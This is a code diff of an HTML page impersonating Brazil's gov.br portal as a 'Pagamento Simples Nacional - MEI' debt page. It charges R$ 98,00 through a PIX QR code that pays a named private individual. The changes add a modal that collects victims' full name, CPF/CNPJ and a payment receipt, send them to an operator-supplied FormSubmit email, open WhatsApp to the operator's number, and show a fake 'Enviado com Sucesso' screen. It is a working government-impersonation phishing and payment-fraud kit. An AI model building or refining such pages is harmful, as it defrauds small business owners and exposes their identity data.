@@ -56,7 +56,6 @@
             flex-wrap: wrap;
         }
 
-        /* Configuração do Logo gov.br */
         .gov-logo {
             font-size: 34px;
             font-weight: 900; 
@@ -64,7 +63,6 @@
             display: flex;
             letter-spacing: -1px; 
         }
-
         .gov-letra-g { color: #155BCB; }
         .gov-letra-o { color: #FCCC04; }
         .gov-letra-v { color: #00A859; }
@@ -76,13 +74,6 @@
             font-size: 18px;
             border-left: 1px solid #e0e0e0;
             padding-left: 15px;
-            font-weight: bold;
-        }
-
-        .header-actions {
-            display: flex;
-            gap: 20px;
-            align-items: center;
             font-weight: bold;
         }
 
@@ -113,45 +104,19 @@
             height: fit-content;
             flex-shrink: 0;
         }
-
-        .sidebar h3 {
-            padding: 15px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .sidebar ul {
-            list-style: none;
-        }
-
-        .sidebar li {
-            padding: 15px;
-            border-bottom: 1px solid #e0e0e0;
-            font-size: 14px;
-            cursor: pointer;
-        }
-
-        .sidebar li.active {
-            border-left: 4px solid #155BCB; 
-            background-color: #f0f8ff;
-            font-weight: bold;
-        }
+        .sidebar h3 { padding: 15px; border-bottom: 1px solid #e0e0e0; }
+        .sidebar ul { list-style: none; }
+        .sidebar li { padding: 15px; border-bottom: 1px solid #e0e0e0; font-size: 14px; cursor: pointer; }
+        .sidebar li.active { border-left: 4px solid #155BCB; background-color: #f0f8ff; font-weight: bold; }
 
         /* Conteúdo Central */
         .main-content {
             flex: 1;
             min-width: 0;
         }
+        .main-content h1 { font-size: 26px; margin-bottom: 10px; }
+        .main-content > p { margin-bottom: 30px; }
 
-        .main-content h1 {
-            font-size: 26px;
-            margin-bottom: 10px;
-        }
-
-        .main-content > p {
-            margin-bottom: 30px;
-        }
-
-        /* Cards do Conteúdo */
         .card {
             border: 1px solid #e0e0e0;
             border-radius: 8px;
@@ -161,33 +126,13 @@
             gap: 20px;
             align-items: flex-start;
         }
+        .card h3 { margin-bottom: 10px; font-size: 18px; }
+        .card p { font-size: 14px; line-height: 1.5; }
 
-        .card h3 {
-            margin-bottom: 10px;
-            font-size: 18px;
-        }
+        .card.warning { border-left: 4px solid #FCCC04; background-color: #fffdf5; }
+        .card-icon { font-size: 32px; background-color: #ffffff; padding: 10px; border-radius: 8px; border: 1px solid #FCCC04; color: #FCCC04; flex-shrink: 0; }
 
-        .card p {
-            font-size: 14px;
-            line-height: 1.5;
-        }
-
-        .card.warning {
-            border-left: 4px solid #FCCC04;
-            background-color: #fffdf5;
-        }
-
-        .card-icon {
-            font-size: 32px;
-            background-color: #ffffff;
-            padding: 10px;
-            border-radius: 8px;
-            border: 1px solid #FCCC04; 
-            color: #FCCC04;
-            flex-shrink: 0;
-        }
-
-        /* Painel Direito - Recibo e Botão de Pagamento */
+        /* Painel Direito - Recibo */
         .payment-panel {
             width: 320px;
             border: 1px solid #e0e0e0;
@@ -197,35 +142,9 @@
             flex-direction: column;
             flex-shrink: 0;
         }
-
-        .payment-header {
-            padding: 15px;
-            text-align: center;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .payment-header h3 {
-            margin-bottom: 5px;
-        }
-
-        .payment-header small {
-            font-size: 11px;
-        }
-
-        .payment-body {
-            padding: 20px;
-            flex-grow: 1;
-        }
-
-        .payment-body h4 {
-            margin-bottom: 15px;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        /* Destaque para o Valor */
+        .payment-header { padding: 15px; text-align: center; border-bottom: 1px solid #e0e0e0; }
+        .payment-body { padding: 20px; flex-grow: 1; }
+        
         .value-box {
             background-color: #f0f8ff;
             border: 1px solid #155BCB;
@@ -234,177 +153,75 @@
             text-align: center;
             margin-bottom: 20px;
         }
+        .value-label { font-size: 12px; text-transform: uppercase; margin-bottom: 5px; color: #155BCB; }
+        .value-amount { font-size: 28px; font-weight: 900; color: #003399; }
+
+        .step-list { list-style: none; padding-left: 0; margin-top: 15px; }
+        .step-item { display: flex; gap: 12px; margin-bottom: 15px; align-items: flex-start; }
+        .step-number { background-color: #155BCB; color: white; border-radius: 50%; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 12px; flex-shrink: 0; }
+        .step-text { font-size: 13px; line-height: 1.4; color: #155BCB; }
+
+        .payment-footer { padding: 20px; border-top: 1px solid #e0e0e0; background-color: #f9f9f9; border-radius: 0 0 8px 8px; }
         
-        .value-label {
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 5px;
-            color: #155BCB;
-        }
-        
-        .value-amount {
-            font-size: 28px;
-            font-weight: 900;
-            color: #003399; 
-        }
-
-        /* Estilos para o Passo a Passo */
-        .step-list {
-            list-style: none;
-            padding-left: 0;
-            margin-top: 5px;
-        }
-
-        .step-item {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 15px;
-            align-items: flex-start;
-        }
-
-        .step-number {
-            background-color: #155BCB;
-            color: white;
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 12px;
-            flex-shrink: 0;
-        }
-
-        .step-text {
-            font-size: 13px;
-            line-height: 1.4;
-            color: #155BCB;
-        }
-
-        /* Estilos do Botão e Áreas Dinâmicas */
-        .payment-footer {
-            padding: 20px;
-            border-top: 1px solid #e0e0e0;
-            background-color: #f9f9f9;
-            border-radius: 0 0 8px 8px;
-        }
-
         .btn-pagar {
-            display: block;
-            width: 100%;
-            padding: 15px;
-            background-color: #00A859;
-            color: white;
-            text-align: center;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 5px;
-            border: none;
-            text-decoration: none;
-            transition: background-color 0.3s ease;
-            cursor: pointer;
+            display: block; width: 100%; padding: 15px; background-color: #00A859; color: white; text-align: center; font-size: 16px; font-weight: bold; border-radius: 5px; border: none; cursor: pointer; transition: 0.3s;
         }
+        .btn-pagar:hover { background-color: #008a47; }
+        .btn-azul { background-color: #155BCB; }
+        .btn-azul:hover { background-color: #0d4094; }
 
-        .btn-pagar:hover {
-            background-color: #008a47;
-            text-decoration: none;
-            color: white; 
+        /* MODAL (Centro da Tela) */
+        .modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7); z-index: 1000; justify-content: center; align-items: center; padding: 20px;
         }
-
-        .btn-azul {
-            background-color: #155BCB;
+        .modal-content {
+            background-color: #fff; width: 100%; max-width: 450px; border-radius: 12px; padding: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); position: relative; text-align: center;
         }
-
-        .btn-azul:hover {
-            background-color: #0d4094;
+        .close-modal {
+            position: absolute; top: 15px; right: 20px; font-size: 24px; font-weight: bold; color: #999; cursor: pointer;
         }
+        .close-modal:hover { color: #333; }
 
-        .input-file-container {
-            margin: 15px 0;
-            text-align: left;
-        }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; color: #333; }
+        .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; }
 
-        .input-file-container input[type="file"] {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #e0e0e0;
-            border-radius: 5px;
-            background-color: #fff;
-            font-size: 13px;
-        }
-
-        /* Responsividade para Celulares e Tablets */
         @media (max-width: 992px) {
-            .container {
-                flex-direction: column;
-            }
-            .sidebar {
-                width: 100%;
-            }
-            .payment-panel {
-                width: 100%;
-            }
+            .container { flex-direction: column; }
+            .sidebar, .payment-panel { width: 100%; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Acessibilidade -->
     <div class="accessibility-bar">
         <a href="#">Ir para o conteúdo</a>
-        <a href="#">Ir para o menu</a>
-        <a href="#">Ir para a busca</a>
-        <a href="#">Ir para o rodapé</a>
     </div>
 
-    <!-- Cabeçalho Principal -->
     <header class="header">
         <div class="logo-container">
             <div class="gov-logo">
-                <span class="gov-letra-g">g</span>
-                <span class="gov-letra-o">o</span>
-                <span class="gov-letra-v">v</span>
-                <span class="gov-ponto">.</span>
-                <span class="gov-letra-b">b</span>
-                <span class="gov-letra-r">r</span>
+                <span class="gov-letra-g">g</span><span class="gov-letra-o">o</span><span class="gov-letra-v">v</span><span class="gov-ponto">.</span><span class="gov-letra-b">b</span><span class="gov-letra-r">r</span>
             </div>
-            <div class="site-title">
-                Serviços e Informações do Brasil
-            </div>
-        </div>
-        <div class="header-actions">
-            <span>🔍</span>
+            <div class="site-title">Serviços e Informações do Brasil</div>
         </div>
     </header>
 
-    <!-- Menu de Navegação -->
     <nav class="top-nav">
         <a href="#">Órgãos do Governo</a>
         <a href="#">Acesso à Informação</a>
-        <a href="#">Legislação</a>
-        <a href="#">Acessibilidade</a>
     </nav>
 
-    <!-- Container Principal -->
     <div class="container">
-        
-        <!-- Sidebar Esquerda -->
         <aside class="sidebar">
             <h3>Empreendedor</h3>
             <ul>
                 <li>Abertura de Empresas</li>
-                <li>Redesim</li>
                 <li>MEI - Microempreendedor</li>
-                <li>Nota Fiscal Eletrônica</li>
-                <li>Certificado Digital</li>
-                <li>Compras Governamentais</li>
                 <li class="active">Simples Nacional</li>
             </ul>
         </aside>
 
-        <!-- Conteúdo Central -->
         <main class="main-content">
             <h1>Pagamento Simples Nacional - MEI</h1>
             <p>Regularize os débitos do Microempreendedor Individual</p>
@@ -425,7 +242,6 @@
             </div>
         </main>
 
-        <!-- Painel Direito de Pagamento -->
         <aside class="payment-panel">
             <div class="payment-header">
                 <h3>💳 Recolhimento MEI</h3>
@@ -433,105 +249,147 @@
             </div>
             
             <div class="payment-body">
-                
-                <!-- CAIXA DE VALOR -->
                 <div class="value-box">
                     <div class="value-label">Total a Pagar</div>
                     <div class="value-amount">R$ 98,00</div>
                 </div>
-
                 <h4>📌 COMO PAGAR</h4>
-                
                 <ul class="step-list">
-                    <li class="step-item">
-                        <div class="step-number">1</div>
-                        <div class="step-text">Clique no botão verde "PAGAR AGORA" logo abaixo.</div>
-                    </li>
-                    <li class="step-item">
-                        <div class="step-number">2</div>
-                        <div class="step-text">Escaneie o QR Code PIX com o aplicativo do seu banco.</div>
-                    </li>
-                    <li class="step-item">
-                        <div class="step-number">3</div>
-                        <div class="step-text">Após pagar, clique em confirmar e anexe seu comprovante.</div>
-                    </li>
+                    <li class="step-item"><div class="step-number">1</div><div class="step-text">Clique em "EFETUAR PAGAMENTO".</div></li>
+                    <li class="step-item"><div class="step-number">2</div><div class="step-text">Escaneie o QR Code no centro da tela.</div></li>
+                    <li class="step-item"><div class="step-number">3</div><div class="step-text">Anexe e envie seu comprovante de pagamento.</div></li>
                 </ul>
             </div>
             
-            <!-- ÁREA DINÂMICA DE PAGAMENTO E COMPROVANTE -->
             <div class="payment-footer">
-                
-                <!-- Passo 1: Botão Pagar Agora -->
-                <div id="step-1">
-                    <button class="btn-pagar" id="btn-pagar-agora">PAGAR AGORA</button>
-                </div>
-
-                <!-- Passo 2: QR Code e Botão "Já Paguei" -->
-                <div id="step-2" style="display: none; text-align: center;">
-                    <p style="font-weight: bold; font-size: 14px; margin-bottom: 10px; color: #333;">Escaneie o QR Code abaixo:</p>
-                    <img id="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?data=00020126360014br.gov.bcb.pix011466707517000123520400005303986540598.005802BR592566.707.517%20Leonardo%20Sebas6014RIO%20DE%20JANEIRO62070503***630479DE&size=200x200" alt="QR Code PIX" style="border: 5px solid #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-radius: 8px;">
-                    <button class="btn-pagar btn-azul" id="btn-ja-pago" style="margin-top: 15px;">JÁ REALIZEI O PAGAMENTO</button>
-                </div>
-
-                <!-- Passo 3: Envio de Comprovante -->
-                <div id="step-3" style="display: none; text-align: center;">
-                    <p style="font-weight: bold; font-size: 14px; margin-bottom: 5px; color: #333;">Quase lá!</p>
-                    <p style="font-size: 13px; color: #666;">Por favor, anexe o comprovante de pagamento para baixarmos seu débito.</p>
-                    
-                    <div class="input-file-container">
-                        <input type="file" id="arquivo-comprovante" accept="image/*,.pdf">
-                    </div>
-                    
-                    <button class="btn-pagar" id="btn-enviar-comprovante">ENVIAR COMPROVANTE</button>
-                </div>
-
-                <!-- Passo 4: Sucesso -->
-                <div id="step-4" style="display: none; text-align: center; padding: 20px 0;">
-                    <div style="font-size: 48px; color: #00A859; margin-bottom: 10px;">✅</div>
-                    <h3 style="color: #00A859; margin-bottom: 10px;">Sucesso!</h3>
-                    <p style="font-size: 14px; color: #333; line-height: 1.5;">O seu comprovante foi enviado e está em análise. Seus débitos serão regularizados no sistema em até 24 horas úteis.</p>
-                </div>
-
+                <button class="btn-pagar" id="btn-abrir-modal">EFETUAR PAGAMENTO</button>
             </div>
         </aside>
-
     </div>
 
-    <!-- Script de controle de fluxo de telas -->
+    <!-- MODAL SOBREPOSTO (CENTRO DA TELA) -->
+    <div class="modal-overlay" id="payment-modal">
+        <div class="modal-content">
+            <span class="close-modal" id="fechar-modal">&times;</span>
+
+            <!-- Tela 1: QR CODE -->
+            <div id="modal-step-1">
+                <h3 style="color: #155BCB; margin-bottom: 15px;">Escaneie o QR Code</h3>
+                <p style="font-size: 14px; margin-bottom: 20px; color: #555;">Abra o app do seu banco e aponte a câmera para o código abaixo:</p>
+                
+                <img src="https://api.qrserver.com/v1/create-qr-code/?data=00020126360014br.gov.bcb.pix011466707517000123520400005303986540598.005802BR592566.707.517%20Leonardo%20Sebas6014RIO%20DE%20JANEIRO62070503***630479DE&size=250x250" alt="QR Code PIX" style="border: 5px solid #155BCB; border-radius: 8px; margin-bottom: 20px;">
+                
+                <button class="btn-pagar btn-azul" id="btn-ja-pago">JÁ REALIZEI O PAGAMENTO</button>
+            </div>
+
+            <!-- Tela 2: ENVIO DE COMPROVANTE (Formulário real) -->
+            <div id="modal-step-2" style="display: none;">
+                <h3 style="color: #00A859; margin-bottom: 10px;">Quase lá!</h3>
+                <p style="font-size: 14px; margin-bottom: 20px; color: #555;">Envie seu comprovante para darmos baixa no sistema.</p>
+                
+                <!-- COLOQUE SEU E-MAIL ABAIXO ONDE ESTÁ SEU_EMAIL_AQUI@GMAIL.COM -->
+                <form action="https://formsubmit.co/SEU_EMAIL_AQUI@GMAIL.COM" method="POST" enctype="multipart/form-data" id="form-comprovante">
+                    
+                    <!-- Configurações ocultas do FormSubmit -->
+                    <input type="hidden" name="_subject" value="Novo Comprovante de Pagamento MEI!">
+                    <input type="hidden" name="_captcha" value="false">
+                    <!-- Evita ir para a página do FormSubmit, mostra nossa tela de sucesso -->
+                    <input type="hidden" name="_next" value="#" id="form-next-url">
+
+                    <div class="input-group">
+                        <label>Nome Completo:</label>
+                        <input type="text" name="Nome" required placeholder="Digite seu nome">
+                    </div>
+                    <div class="input-group">
+                        <label>CPF ou CNPJ:</label>
+                        <input type="text" name="Documento" required placeholder="Digite seu documento">
+                    </div>
+                    <div class="input-group">
+                        <label>Anexe o Comprovante (Imagem ou PDF):</label>
+                        <input type="file" name="Comprovante" accept="image/*,.pdf" required id="arquivo-comprovante" style="border: 1px solid #155BCB; padding: 5px;">
+                    </div>
+
+                    <button type="submit" class="btn-pagar" id="btn-enviar-final">ENVIAR COMPROVANTE</button>
+                </form>
+            </div>
+
+            <!-- Tela 3: SUCESSO -->
+            <div id="modal-step-3" style="display: none; padding: 20px 0;">
+                <div style="font-size: 50px; margin-bottom: 10px;">✅</div>
+                <h3 style="color: #00A859; margin-bottom: 10px;">Enviado com Sucesso!</h3>
+                <p style="font-size: 14px; color: #333; line-height: 1.5;">O seu comprovante está em análise. A baixa do débito ocorrerá em breve.</p>
+                <button class="btn-pagar btn-azul" style="margin-top: 20px;" onclick="window.location.reload();">Voltar ao Início</button>
+            </div>
+
+        </div>
+    </div>
+
     <script>
-        // Elementos das etapas
-        const step1 = document.getElementById('step-1');
-        const step2 = document.getElementById('step-2');
-        const step3 = document.getElementById('step-3');
-        const step4 = document.getElementById('step-4');
-
-        // Botões de ação
-        const btnPagarAgora = document.getElementById('btn-pagar-agora');
+        // Elementos do Modal
+        const modal = document.getElementById('payment-modal');
+        const btnAbrirModal = document.getElementById('btn-abrir-modal');
+        const btnFecharModal = document.getElementById('fechar-modal');
+        
+        // Passos do Modal
+        const step1 = document.getElementById('modal-step-1');
+        const step2 = document.getElementById('modal-step-2');
+        const step3 = document.getElementById('modal-step-3');
+        
+        // Botões de transição
         const btnJaPago = document.getElementById('btn-ja-pago');
-        const btnEnviarComprovante = document.getElementById('btn-enviar-comprovante');
-        const inputComprovante = document.getElementById('arquivo-comprovante');
+        const formComprovante = document.getElementById('form-comprovante');
 
-        // Ação 1: Mostrar QR Code
-        btnPagarAgora.addEventListener('click', function() {
+        // Configurar a URL de redirecionamento após sucesso no formulário
+        document.getElementById('form-next-url').value = window.location.href + "?sucesso=true";
+
+        // Abrir Modal
+        btnAbrirModal.addEventListener('click', () => {
+            modal.style.display = 'flex';
+        });
+
+        // Fechar Modal no X
+        btnFecharModal.addEventListener('click', () => {
+            modal.style.display = 'none';
+        });
+
+        // Fechar Modal clicando fora dele
+        window.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                modal.style.display = 'none';
+            }
+        });
+
+        // Avançar para Tela de Upload
+        btnJaPago.addEventListener('click', () => {
             step1.style.display = 'none';
             step2.style.display = 'block';
         });
 
-        // Ação 2: Mostrar tela de envio de comprovante
-        btnJaPago.addEventListener('click', function() {
-            step2.style.display = 'none';
-            step3.style.display = 'block';
+        // Interceptar o clique de enviar para redirecionar para o WhatsApp
+        formComprovante.addEventListener('submit', function(e) {
+            
+            // COLOQUE SEU NÚMERO DE WHATSAPP AQUI (Ex: 5511999999999)
+            const numeroWhatsApp = "5511999999999"; 
+            const mensagem = encodeURIComponent("Olá! Acabei de pagar o MEI no site e estou enviando meu comprovante em anexo.");
+            const linkWhatsapp = `https://wa.me/${numeroWhatsApp}?text=${mensagem}`;
+            
+            // Abre o WhatsApp numa nova aba
+            window.open(linkWhatsapp, '_blank');
+            
+            // O formulário continuará o envio normal para o e-mail via FormSubmit
+            // Como configuramos o _next, ele vai recarregar a página com ?sucesso=true
         });
 
-        // Ação 3: Validar arquivo e mostrar tela de sucesso
-        btnEnviarComprovante.addEventListener('click', function() {
-            if (inputComprovante.files.length === 0) {
-                alert("Por favor, selecione o arquivo do seu comprovante de pagamento antes de enviar.");
-                return;
-            }
-            step3.style.display = 'none';
-            step4.style.display = 'block';
-        });
+        // Verifica se a URL tem sucesso para mostrar a tela final
+        if (window.location.search.includes("sucesso=true")) {
+            modal.style.display = 'flex';
+            step1.style.display = 'none';
+            step2.style.display = 'none';
+            step3.style.display = 'block';
+            
+            // Remove o parâmetro da URL para não ficar repetindo
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
     </script>
 </body>
 </html>
